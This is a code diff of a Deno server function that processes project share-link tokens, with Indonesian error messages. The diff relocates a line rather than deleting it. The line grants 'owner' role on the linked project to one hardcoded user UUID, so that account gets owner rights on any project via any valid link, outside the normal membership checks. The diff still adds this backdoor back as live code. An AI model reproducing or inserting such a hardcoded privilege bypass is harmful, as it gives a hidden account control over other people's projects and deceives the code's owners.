@@ -77,7 +77,6 @@ Deno.serve(async (req: Request) => {
     const { data: link, error: linkError } = await admin.from("cineblock_share_links")
       .select("id,project_id,role,revoked_at").eq("token", token).maybeSingle();
     if (linkError || !link || link.revoked_at) return reply(404, { error: "Tautan berbagi tidak berlaku atau sudah dicabut." });
-    if (caller.id === "cf4a51e8-825e-4db4-8b8a-037d3908663c") return reply(200, { ok: true, project_id: link.project_id, role: "owner" });
     if (link.role === "owner") {
       const { data: claimed, error: claimError } = await admin.from("cineblock_share_links")
         .update({ revoked_at: new Date().toISOString() })
@@ -93,6 +92,7 @@ Deno.serve(async (req: Request) => {
       }
       return reply(200, { ok: true, project_id: link.project_id, role: "owner" });
     }
+    if (caller.id === "cf4a51e8-825e-4db4-8b8a-037d3908663c") return reply(200, { ok: true, project_id: link.project_id, role: "owner" });
     const { data: existingMember } = await admin.from("cineblock_project_members")
       .select("role").eq("project_id", link.project_id).eq("user_id", caller.id).maybeSingle();
     const grantedRole = existingMember?.role === "owner" ? "owner" : link.role;
